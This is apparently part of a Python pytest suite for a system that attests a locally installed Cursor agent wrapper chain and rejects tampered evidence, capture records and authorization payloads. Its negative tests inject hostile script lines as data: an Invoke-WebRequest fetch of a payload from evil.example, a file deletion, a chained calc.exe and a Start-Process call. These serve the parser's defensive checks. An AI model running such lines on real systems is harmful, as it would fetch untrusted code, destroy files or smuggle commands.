    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED; request=h.store.load_request(h.session_id,"native-canary-gate",0); evidence=load_behavioral_verifier(request=request,execution_store=h.store); assert evidence.exit_code != 0
    assert EXPECTED_MATERIAL_PATHS.issubset(set(h.store.load_result(h.session_id,"native-canary-gate",0).changed_material_files))


def test_genuine_implementation_passes_behavioral_verifier_and_reconstructs_disk_evidence(tmp_path: Path):
    h=_harness(tmp_path); first=h.coordinator.run(session_id=h.session_id); assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
    second=h.coordinator.run(session_id=h.session_id); assert second.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and second.provider_invocations==0 and len(h.runner.invocations)==1
    request=h.store.load_request(h.session_id,"native-canary-gate",0); assert run_behavioral_verifier(request=request,execution_store=h.store).exit_code==0


def test_capture_failure_is_terminal_and_repeated_call_never_retries(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",lambda **_: (_ for _ in ()).throw(RuntimeError("capture boom")))
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and second.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and len(h.runner.invocations)==1


def _materialize_success_with_failing_checkpoint_command(repository: Path) -> None:
    _materialize_success(repository)
    package=json.loads((repository/"package.json").read_text(encoding="utf-8"))
    package["scripts"]["test"]="node --input-type=module -e \"process.exit(7)\""
    (repository/"package.json").write_text(json.dumps(package),encoding="utf-8",newline="\n")
    env=dict(os.environ); env.update({"GIT_AUTHOR_NAME":"Deterministic Fake Executor","GIT_AUTHOR_EMAIL":"fake@invalid.example","GIT_COMMITTER_NAME":"Deterministic Fake Executor","GIT_COMMITTER_EMAIL":"fake@invalid.example","GIT_AUTHOR_DATE":"2026-01-02T00:00:00Z","GIT_COMMITTER_DATE":"2026-01-02T00:00:00Z"})
    _command(["git","add","package.json"],cwd=repository); _command(["git","commit","--quiet","--amend","--no-edit"],cwd=repository,env=env)


def test_failed_checkpoint_command_is_terminal_and_never_persists_success(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=_materialize_success_with_failing_checkpoint_command)); count={"value":0}
    from admissible.delegated_gate.checkpoint import capture_checkpoint as production_capture_checkpoint
    def counted_capture(**kwargs: object) -> object:
        count["value"]+=1
        return production_capture_checkpoint(**kwargs)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",counted_capture)
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    state=h.session_store.load(h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and second.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED
    assert state.phase is Phase.GATE_EXECUTING and state.checkpoint_history==() and count["value"]==1


def test_started_capture_record_is_ambiguous_and_never_replayed(tmp_path: Path):
    h=_harness(tmp_path); state=h.session_store.load(h.session_id); started=__import__("admissible.delegated_gate.reducer",fromlist=["reduce"]).reduce(state,__import__("admissible.delegated_gate.events",fromlist=["GateExecutionStarted"]).GateExecutionStarted(state.current_gate.gate_id)); h.session_store.replace(started,expected_revision=state.revision)
    request,prompt=_request(h); h.store.create_request(request); issued=h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory); result=h.store.write_result(issued); behavioral=run_behavioral_verifier(request=request,execution_store=h.store)
    h.store.create_capture_attempt(request=request,result=result,gate_plan_fingerprint=state.gate_plan.plan_fingerprint,checkpoint_contract_fingerprint=state.current_gate.contract_fingerprint,behavioral_evidence_fingerprint=behavioral.evidence_fingerprint,required_command_ids=tuple(command.command_id for command in state.current_gate.checkpoint_verification_commands),state_revision=state.revision)
    outcome=h.coordinator.run(session_id=h.session_id); assert outcome.status is NativeCanaryStatus.CAPTURE_ATTEMPT_AMBIGUOUS and len(h.runner.invocations)==1


def test_checkpoint_artifact_tamper_blocks_final_reconstruction(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success; state=h.session_store.load(h.session_id); ref=state.checkpoint_history[-1].artifact_references[0]; path=h.evidence/"checkpoint-artifacts"/ref.relative_path; path.write_bytes(path.read_bytes()+b"tamper")
    with pytest.raises(NativeEvidenceInvalid,match="checkpoint artifact hash"):
        h.coordinator.run(session_id=h.session_id)


@pytest.mark.parametrize(("field", "value"), [
    ("checkpoint_contract_fingerprint", "0" * 64),
    ("gate_id", "substituted-gate"),
    ("request_fingerprint", "1" * 64),
    ("result_fingerprint", "2" * 64),
    ("behavioral_evidence_fingerprint", "3" * 64),
    ("capture_attempt_id", "capture:other-session:other-gate:0"),
    ("expected_terminal_status", "CAPTURE_FAILED"),
])
def test_reconstruction_binds_every_capture_attempt_authority_field(tmp_path: Path, field: str, value: str):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    path=h.store._path("capture-attempt",h.session_id,"native-canary-gate",0); original=path.read_bytes(); raw=json.loads(original)
    raw[field]=value; raw["attempt_fingerprint"]=fingerprint({key:item for key,item in raw.items() if key!="attempt_fingerprint"}); path.write_bytes(__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(raw)+b"\n")
    with pytest.raises(NativeEvidenceInvalid): h.coordinator.run(session_id=h.session_id)


def test_duplicate_capture_attempt_record_blocks_final_reconstruction(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    original=h.store._path("capture-attempt",h.session_id,"native-canary-gate",0)
    duplicate=h.store.directory/f"{h.session_id}.native-canary-gate.attempt-99.native-capture-attempt.json"; duplicate.write_bytes(original.read_bytes())
    with pytest.raises(NativeEvidenceInvalid,match="alternate or duplicate"):
        h.coordinator.run(session_id=h.session_id)


def test_authorization_payload_binds_backend_head_model_timeout_and_run_id(tmp_path: Path,monkeypatch: pytest.MonkeyPatch):
    h=_harness(tmp_path); payload=build_authorization_payload(source_repository=h.source,source_head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip(),run_id="run-one",session_id=h.session_id,attestation=h.attestation,run_root=tmp_path/"future-run",timeout_seconds=30)
    phrase="owner phrase"; digest=hashlib.sha256(phrase.encode()+b"\0"+__import__("admissible.delegated_gate.canonical",fromlist=["canonical_bytes"]).canonical_bytes(payload.to_dict())).hexdigest(); monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256",digest)
    from admissible.delegated_gate.native_canary import _authorized
    assert _authorized(phrase,payload) and not _authorized("wrong",payload)
    changed=payload.to_dict(); changed["run_id"]="run-two"; changed["payload_fingerprint"]=fingerprint({key:value for key,value in changed.items() if key!="payload_fingerprint"})
    from admissible.delegated_gate.native_canary import NativeCanaryAuthorizationPayload
    assert not _authorized(phrase,NativeCanaryAuthorizationPayload(**{**changed,"launcher_prefix":tuple(changed["launcher_prefix"]),"budgets":tuple(changed["budgets"])}).validated())
    for field,value in (("source_head","f"*40),("backend_attestation_fingerprint","0"*64),("selected_model","other-model"),("timeout_seconds",31)):
        changed=payload.to_dict(); changed[field]=value; changed["payload_fingerprint"]=fingerprint({key:value for key,value in changed.items() if key!="payload_fingerprint"})
        altered=NativeCanaryAuthorizationPayload(**{**changed,"launcher_prefix":tuple(changed["launcher_prefix"]),"budgets":tuple(changed["budgets"])}).validated()
        assert not _authorized(phrase,altered)


def test_preflight_only_is_effect_free_and_existing_run_id_is_rejected(tmp_path: Path,monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    h=_harness(tmp_path); head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip(); preflight_root=tmp_path/"preflight-run"
    common=["--source-repository",str(h.source),"--required-source-head",head,"--run-root",str(preflight_root),"--run-id","preflight-run","--session-id",h.session_id,"--executable",h.config.executable,"--executable-prefix-arg",h.config.launcher_prefix[0],"--timeout-seconds","30"]
    # An injected test attestation is not production provenance.  The real CLI
    # therefore blocks before creating a run root or invoking any provider.
    assert main([*common,"--preflight-only"])==2 and not preflight_root.exists() and h.runner.invocations==[]
    captured=json.loads(capsys.readouterr().out)
    assert captured["status"]==NativePreflightStatus.PREFLIGHT_BLOCKED.value


# --- Act 2A.2: LOCAL_WRAPPER_CHAIN attestation ------------------------------

from admissible.delegated_gate.native_canary import NativeCanaryAuthorizationPayload
from admissible.delegated_gate.native_executor import (
    ATTESTATION_CLASS_PACKAGE_BIN,
    ATTESTATION_CLASS_WRAPPER_CHAIN,
    WRAPPER_CHAIN_CLAIMS,
    WRAPPER_CHAIN_NON_CLAIMS,
    WRAPPER_CHAIN_READY_REASON,
    WrapperChainBackendAttestation,
    attestation_from_dict,
    preflight_native_cursor as _preflight,
    _attest_local_backend,
    _attest_wrapper_chain_cursor,
    _parse_cmd_wrapper,
    _parse_powershell_wrapper,
    _POWERSHELL_WRAPPER_TEMPLATE_LINES,
)

_OBSERVED_CMD_WRAPPER = (
    '@echo off\r\n'
    'setlocal enabledelayedexpansion\r\n'
    'set "CURSOR_INVOKED_AS=%~nx0"\r\n'
    '\r\n'
    'REM Get the directory of this script\r\n'
    'set "SCRIPT_DIR=%~dp0"\r\n'
    'REM Remove trailing backslash\r\n'
    'if "%SCRIPT_DIR:~-1%"=="\\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"\r\n'
    '\r\n'
    '%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%\\cursor-agent.ps1" %*\r\n'
)
_OBSERVED_PS_WRAPPER = "## Locally observed Anysphere launcher\r\n" + "\r\n".join(_POWERSHELL_WRAPPER_TEMPLATE_LINES) + "\r\n"


def _wrapper_chain_installation(tmp_path: Path, *, versions: tuple[str, ...] = ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0"), manifest_name: str = EXPECTED_CURSOR_PACKAGE_NAME) -> Path:
    root = tmp_path / "wrapper-install"; root.mkdir()
    (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    (root / "cursor-agent.ps1").write_bytes(_OBSERVED_PS_WRAPPER.encode("utf-8"))
    for name in versions:
        version = root / "versions" / name; version.mkdir(parents=True)
        shutil.copy2(Path(sys.executable).resolve(), version / "node.exe")
        (version / "index.js").write_text("// deterministic fake cursor entry\n", encoding="utf-8")
        (version / "package.json").write_text(json.dumps({"name": manifest_name}), encoding="utf-8")
        (version / "cursor-agent.cmd").write_bytes((root / "cursor-agent.cmd").read_bytes())
        (version / "cursor-agent.ps1").write_bytes((root / "cursor-agent.ps1").read_bytes())
    return root


@dataclass
class FakeWrapperChainDiscovery:
    """Explicit test-only discovery seam; unreachable from the production CLI."""

    root: Path
    which: str | None = None
    where: tuple[str, ...] | None = None
    powershell: tuple[str, ...] | None = None
    path: str | None = None
    pathext: str = ".COM;.EXE;.BAT;.CMD"

    def which_cursor_agent(self) -> str | None: return self.which if self.which is not None else str(self.root / "cursor-agent.cmd")
    def where_cursor_agent(self) -> tuple[str, ...]: return self.where if self.where is not None else (str(self.root / "cursor-agent.cmd"),)
    def powershell_cursor_agent(self) -> tuple[str, ...] | None: return self.powershell if self.powershell is not None else (str(self.root / "cursor-agent.ps1"),)
    def path_value(self) -> str: return self.path if self.path is not None else str(self.root) + os.pathsep + "C:\\Windows"
    def pathext_value(self) -> str: return self.pathext
    def node_signature_context(self, node_path: Path) -> str: return "NotSigned|test-context"


_WRAPPER_CONFIG = CursorNativeBackendConfig(executable="cursor-agent", attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)


def _wrapper_attestation(tmp_path: Path) -> tuple[Path, FakeWrapperChainDiscovery, WrapperChainBackendAttestation]:
    root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(root)
    return root, discovery, _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)


def test_wrapper_chain_positive_recognizes_observed_grammar_and_selects_latest(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    assert attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert attestation.version_inventory == ("2026.06.15-18-00-12-6f5a2cf", "2026.07.09-a3815c0")
    assert attestation.selected_version == "2026.07.09-a3815c0"
    selected = root / "versions" / "2026.07.09-a3815c0"
    assert Path(attestation.executable.canonical_path) == selected / "node.exe"
    assert Path(attestation.launcher_prefix[0].canonical_path) == selected / "index.js"
    assert attestation.cmd_semantics["adjacent_powershell_target"] == "cursor-agent.ps1"
    assert attestation.powershell_semantics["executes"] == "selected-version node.exe index.js"
    assert dict(attestation.claims) == WRAPPER_CHAIN_CLAIMS and attestation.claims["publisher_provenance_established"] is False
    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
    assert attestation.manifest_declares_cursor_agent_bin is False
    reloaded = attestation_from_dict(json.loads(json.dumps(attestation.to_dict())))
    assert isinstance(reloaded, WrapperChainBackendAttestation) and reloaded == attestation
    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery) == attestation


def test_wrapper_chain_requires_explicit_class_and_rejects_caller_supplied_roots(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    with pytest.raises(ValueError, match="explicitly configured"):
        _attest_wrapper_chain_cursor(CursorNativeBackendConfig(executable="cursor-agent"), discovery=FakeWrapperChainDiscovery(root))
    with pytest.raises(ValueError, match="bare canonical"):
        CursorNativeBackendConfig(executable=str(root / "cursor-agent.cmd"), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
    with pytest.raises(ValueError, match="bare canonical"):
        CursorNativeBackendConfig(executable="cursor-agent", launcher_prefix=(str(root / "cursor-agent.ps1"),), attestation_class=ATTESTATION_CLASS_WRAPPER_CHAIN)
    # A failed package-bin attestation raises; it never downgrades in place.
    with pytest.raises(ValueError):
        _attest_local_backend(CursorNativeBackendConfig(executable=str(_fake_cursor_executable(tmp_path).resolve()), launcher_prefix=(str(root / "cursor-agent.ps1"),)))


def test_production_wrapper_chain_surface_has_no_injection_seam():
    import inspect
    from admissible.delegated_gate.native_canary import build_parser as production_parser
    assert set(inspect.signature(_preflight).parameters) == {"config", "work_workspace"}
    options = {option for action in production_parser()._actions for option in action.option_strings}
    assert not any("discovery" in option or "attestation-file" in option for option in options)


@pytest.mark.parametrize("mutate", [
    lambda text: text + "del /q important.txt\r\n",
    lambda text: text.replace("cursor-agent.ps1", "other.ps1"),
    lambda text: text.replace(" %*", " %* --force"),
    lambda text: text.replace("%*\r\n", "%* & calc.exe\r\n"),
    lambda text: text.replace('"%SCRIPT_DIR%\\cursor-agent.ps1"', '"C:\\Temp\\cursor-agent.ps1"'),
    lambda text: text.replace("-NoProfile ", ""),
    lambda text: text.replace('set "SCRIPT_DIR=%~dp0"', 'cd /d C:\\ \r\nset "SCRIPT_DIR=%~dp0"'),
])
def test_cmd_wrapper_parser_rejects_non_audited_semantics(mutate):
    with pytest.raises(ValueError):
        _parse_cmd_wrapper(mutate(_OBSERVED_CMD_WRAPPER).encode("ascii"), wrapper_name="cursor-agent.cmd")


@pytest.mark.parametrize("mutate", [
    lambda text: text + "Invoke-WebRequest https://evil.example/payload -OutFile $scriptPath\\update.ps1\r\n",
    lambda text: text.replace("$args\r\n", "$args --force\r\n"),
    lambda text: text.replace('"$scriptPath\\versions"', '"$env:TEMP\\versions"'),
    lambda text: text.replace("'^\\d{4}", "'^\\d{2}"),
    lambda text: text.replace("Select-Object -First 1", "Select-Object -Last 1"),
    lambda text: text + '@"\r\nhidden\r\n"@\r\n',
    lambda text: text.replace("exit $LASTEXITCODE\r\n", "exit $LASTEXITCODE\r\nStart-Process installer.exe\r\n"),
])
def test_powershell_wrapper_recognizer_fails_closed(mutate):
    with pytest.raises(ValueError):
        _parse_powershell_wrapper(mutate(_OBSERVED_PS_WRAPPER).encode("utf-8"))


def test_contradictory_or_out_of_root_command_resolution_blocks(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    (elsewhere / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    base = FakeWrapperChainDiscovery(root)
    for discovery in (
        FakeWrapperChainDiscovery(root, which=str(elsewhere / "cursor-agent.cmd")),
        FakeWrapperChainDiscovery(root, where=(str(elsewhere / "cursor-agent.cmd"), str(root / "cursor-agent.cmd"))),
        FakeWrapperChainDiscovery(root, where=(str(root / "cursor-agent.cmd"), str(elsewhere / "cursor-agent.cmd"))),
        FakeWrapperChainDiscovery(root, powershell=(str(elsewhere / "cursor-agent.cmd"),)),
        FakeWrapperChainDiscovery(root, path="C:\\Windows"),
        FakeWrapperChainDiscovery(root, pathext=".COM;.EXE;.BAT"),
        FakeWrapperChainDiscovery(root, where=()),
        FakeWrapperChainDiscovery(root, which=""),
    ):
        with pytest.raises(ValueError):
            _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
    assert _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=base) is not None


def test_changed_path_fingerprint_produces_a_different_attestation(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    reordered = FakeWrapperChainDiscovery(root, path="C:\\Windows" + os.pathsep + str(root))
    other = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=reordered)
    assert other.attestation_fingerprint != attestation.attestation_fingerprint


def test_version_tie_ambiguity_and_grammar_mismatch_block(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path, versions=("2026.07.09-a3815c0", "2026.7.9-bbbbbbb"))
    with pytest.raises(ValueError, match="ambiguous"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))
    (tmp_path / "bad").mkdir()
    bad = _wrapper_chain_installation(tmp_path / "bad", versions=("not-a-version",))
    with pytest.raises(ValueError, match="grammar"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(bad))


def test_junction_or_symlink_version_directory_is_refused(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    target = tmp_path / "redirect-target"; target.mkdir()
    link = root / "versions" / "2026.08.01-cafecafe"
    if os.name == "nt":
        completed = subprocess.run(["cmd.exe", "/d", "/c", "mklink", "/J", str(link), str(target)], shell=False, capture_output=True)
        if completed.returncode != 0: pytest.skip("junction creation unavailable")
    else:
        try: os.symlink(target, link, target_is_directory=True)
        except (OSError, NotImplementedError): pytest.skip("symlinks unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root))


@pytest.mark.parametrize("mutate", [
    lambda root, selected: (root / "cursor-agent.cmd").write_bytes(_OBSERVED_CMD_WRAPPER.replace(" %*", " %* --trust").encode("ascii")),
    lambda root, selected: (root / "cursor-agent.ps1").write_bytes((_OBSERVED_PS_WRAPPER + "Copy-Item a b\r\n").encode("utf-8")),
    lambda root, selected: (selected / "cursor-agent.ps1").write_bytes(b"# hollowed\r\n" + (root / "cursor-agent.ps1").read_bytes()),
    lambda root, selected: (selected / "index.js").write_text("// substituted entry\n", encoding="utf-8"),
    lambda root, selected: (selected / "node.exe").write_bytes((selected / "node.exe").read_bytes() + b"x"),
    lambda root, selected: (selected / "package.json").write_text(json.dumps({"name": "impostor-package"}), encoding="utf-8"),
    lambda root, selected: (root / "versions" / "2026.08.01-cafecafe").mkdir(),
    lambda root, selected: shutil.copy2(selected / "node.exe", root / "node.exe"),
])
def test_any_authoritative_change_after_attestation_fails_revalidation_and_blocks_spawn(tmp_path: Path, mutate):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    selected = root / "versions" / attestation.selected_version
    mutate(root, selected)
    with pytest.raises(ValueError):
        attestation.validated()


def test_substituted_wrapper_chain_attestation_with_recomputed_fingerprints_is_rejected(tmp_path: Path):
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    raw = attestation.to_dict()
    raw["selected_version"] = "2026.06.15-18-00-12-6f5a2cf"
    raw["attestation_fingerprint"] = fingerprint({key: value for key, value in raw.items() if key != "attestation_fingerprint"})
    with pytest.raises(ValueError):
        attestation_from_dict(raw)
    lying = attestation.to_dict()
    lying["claims"] = {**lying["claims"], "publisher_provenance_established": True}
    lying["attestation_fingerprint"] = fingerprint({key: value for key, value in lying.items() if key != "attestation_fingerprint"})
    with pytest.raises(ValueError, match="claim"):
        attestation_from_dict(lying)


def _wrapper_chain_harness(tmp_path: Path) -> tuple[Harness, FakeWrapperChainDiscovery]:
    source_parent = tmp_path / "source-parent"; source_parent.mkdir(); source = build_canary_repository(source_parent, repository_name="source").repository
    root = tmp_path / "run"; root.mkdir(); work = build_canary_repository(root).repository; evidence = root / "evidence"; evidence.mkdir()
    install_root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(install_root)
    attestor = lambda config: _attest_wrapper_chain_cursor(config, discovery=discovery)
    attestation = attestor(_WRAPPER_CONFIG)
    fake = FakeNativeProcessRunner(); store = AtomicNativeExecutionStore(evidence / "native-execution", directory_sync=lambda _: None); session_store = AtomicDelegatedSessionStore(evidence / "delegated-state")
    session_id = "wrapper-chain-session"; session_store.create(create_canary_session(session_id=session_id))
    executor = NativeDelegatedExecutor(config=_WRAPPER_CONFIG, process_runner=fake, clock=Clock(), local_attestor=attestor)
    coordinator = NativeCanaryCoordinator(session_store=session_store, execution_store=store, executor=executor, backend_attestation=attestation, source_repository=source, work_workspace=work, canary_parent=root, evidence_directory=evidence, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
    return Harness(root, source, work, evidence, _WRAPPER_CONFIG, attestation, fake, store, session_store, executor, coordinator, session_id), discovery


def test_wrapper_chain_attestation_round_trips_through_request_execution_and_reconstruction(tmp_path: Path):
    h, discovery = _wrapper_chain_harness(tmp_path)
    first = h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS
    second = h.coordinator.run(session_id=h.session_id)
    assert second.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and len(h.runner.invocations) == 1
    request = h.store.load_request(h.session_id, "native-canary-gate", 0)
    assert isinstance(request.backend_attestation, WrapperChainBackendAttestation)
    assert request.backend_attestation.attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    argv = h.runner.invocations[0].argv
    assert argv[0] == h.attestation.executable.canonical_path and argv[1] == h.attestation.launcher_prefix[0].canonical_path


def test_new_later_version_after_authorization_blocks_spawn_and_invalidates_payload(tmp_path: Path):
    h, discovery = _wrapper_chain_harness(tmp_path)
    state = h.session_store.load(h.session_id)
    prompt = build_native_agent_prompt(mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work)
    request = NativeExecutionRequest.create(session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0, mission_fingerprint=state.mission.mission_fingerprint, gate_contract_fingerprint=state.current_gate.contract_fingerprint, work_workspace=h.work, evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory, attestation=h.attestation, prompt=prompt, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
    assert payload.backend_attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert tuple(payload.attestation_non_claims) == WRAPPER_CHAIN_NON_CLAIMS
    install_root = Path(h.attestation.command_resolution.wrapper_root)
    later = install_root / "versions" / "2026.08.01-cafecafe"; later.mkdir()
    shutil.copy2(Path(sys.executable).resolve(), later / "node.exe")
    (later / "index.js").write_text("// newer entry\n", encoding="utf-8")
    (later / "package.json").write_text(json.dumps({"name": EXPECTED_CURSOR_PACKAGE_NAME}), encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root, allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations == []
    fresh = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
    new_payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=fresh, run_root=tmp_path / "future-run", timeout_seconds=30)
    assert new_payload.payload_fingerprint != payload.payload_fingerprint


def test_authorization_payload_rejects_mismatched_class_and_non_claims(tmp_path: Path):
    h, _ = _wrapper_chain_harness(tmp_path)
    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
    for field, value in (
        ("backend_attestation_class", ATTESTATION_CLASS_PACKAGE_BIN),
        ("backend_attestation_class", "CURSOR_INSTALLATION_PROVEN"),
        ("attestation_non_claims", []),
        ("attestation_non_claims", list(WRAPPER_CHAIN_NON_CLAIMS[:-1])),
    ):
        changed = payload.to_dict(); changed[field] = value
        changed["payload_fingerprint"] = fingerprint({key: item for key, item in changed.items() if key != "payload_fingerprint"})
        with pytest.raises(ValueError):
            NativeCanaryAuthorizationPayload(**{**changed, "launcher_prefix": tuple(changed["launcher_prefix"]), "budgets": tuple(changed["budgets"]), "attestation_non_claims": tuple(changed["attestation_non_claims"])}).validated()


def test_real_host_wrapper_chain_preflight_is_static_and_truthfully_non_overclaiming():
    if os.name != "nt" or shutil.which("cursor-agent") is None:
        pytest.skip("Cursor Agent is not locally installed")
    decision = _preflight(config=_WRAPPER_CONFIG)
    if decision.status is not NativePreflightStatus.PREFLIGHT_READY:
        pytest.skip(f"local wrapper chain does not currently attest: {decision.detail}")
    assert decision.reason_code == WRAPPER_CHAIN_READY_REASON
    attestation = decision.attestation
    assert isinstance(attestation, WrapperChainBackendAttestation)
    assert attestation.claims["publisher_provenance_established"] is False
    assert attestation.claims["cli_capability_behavior_proven"] is False
    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
    assert "CURSOR_INSTALLATION_PROVEN" not in decision.reason_code


def test_prompt_header_and_no_agent_os_import():
    package=Path(__file__).resolve().parents[1]/"admissible"/"delegated_gate"; source=(package/"native_executor.py").read_text(encoding="utf-8")+(package/"native_canary.py").read_text(encoding="utf-8")
    assert "agent_os" not in source and build_native_agent_prompt(mission=create_canary_session(session_id="s").mission,gate_contract=create_canary_session(session_id="s").current_gate,work_workspace=Path.cwd()).startswith("You are the Admissible native coding agent.")
